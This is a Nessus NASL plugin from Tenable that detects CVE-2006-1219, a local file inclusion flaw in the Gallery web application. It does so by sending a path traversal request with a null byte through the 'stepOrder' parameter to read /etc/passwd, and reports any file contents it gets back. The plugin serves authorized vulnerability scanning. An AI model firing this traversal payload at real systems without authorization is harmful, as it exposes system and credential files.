#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21040);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_cve_id("CVE-2006-1219");
  script_bugtraq_id(17051);
  script_osvdb_id(23785);

  script_name(english:"Gallery stepOrder Parameter Local File Inclusion");
  script_summary(english:"Tries to read a file using Gallery stepOrder parameter");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP application that is affected by
multiple local file include flaws."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Gallery hosted on the remote web server fails to
sanitize input to the 'stepOrder' parameter of the 'upgrade/index.php'
and 'install/index.php' scripts before using it in a PHP 'require()'
function.  An unauthenticated attacker may be able to exploit this issue
to view arbitrary files or to execute arbitrary PHP code on the affected
host provided the PHP's 'register_globals' setting is enabled. 

Note that Nessus has only tested the 'upgrade/index.php' script to
confirm this issue."
  );
  # http://downloads.securityfocus.com/vulnerabilities/exploits/gallery_stepOrder_watermark.php
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8626cc0e");
  script_set_attribute(attribute:"see_also", value:"http://galleryproject.org/2.0.4_and_2.1_rc_2a_update");
  script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting, delete the application's
'upgrade/index.php' or 'install/index.php' scripts, or upgrade to
Gallery version 2.0.4 / 2.1-RC-2a or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/03/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/03/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/03/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gallery_project:gallery");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("gallery_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/gallery", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "gallery",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];

file =  mult_str(str:"../", nb:12) + "etc/passwd";
res = http_send_recv3(
  method : "GET",
  item   : dir + "/upgrade/index.php?stepOrder[]=" + file + "%00",
  port   : port,
  exit_on_fail : TRUE
);

# There's a problem if...
if (
  # there's an entry for root or...
  egrep(pattern:"root:.*:0:[01]:", string:res[2]) ||
  # we get an error saying "failed to open stream" or "failed opening".
  #
  # nb: this suggests magic_quotes_gpc was enabled but passing
  #     remote URLs might still work.
  egrep(pattern:"main\(.+/etc/passwd\\0Step\.class.+ failed to open stream", string:res[2]) ||
  egrep(pattern:"Failed opening required '.+/etc/passwd\\0Step\.class'", string:res[2])
)
{
  if (egrep(pattern:"root:.*:0:[01]:", string:res[2]))
  {
    contents = res[2] - strstr(res[2], "<br ");
  }

  if (isnull(contents)) security_warning(port);
  else
  {
    report =
      "\n" +
      "Here are the contents of the file '/etc/passwd' that\n" +
      "Nessus was able to read from the remote host :\n" +
      "\n" +
      contents;
    security_warning(port:port, extra:report);
  }
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Gallery", build_url(qs:dir, port:port));
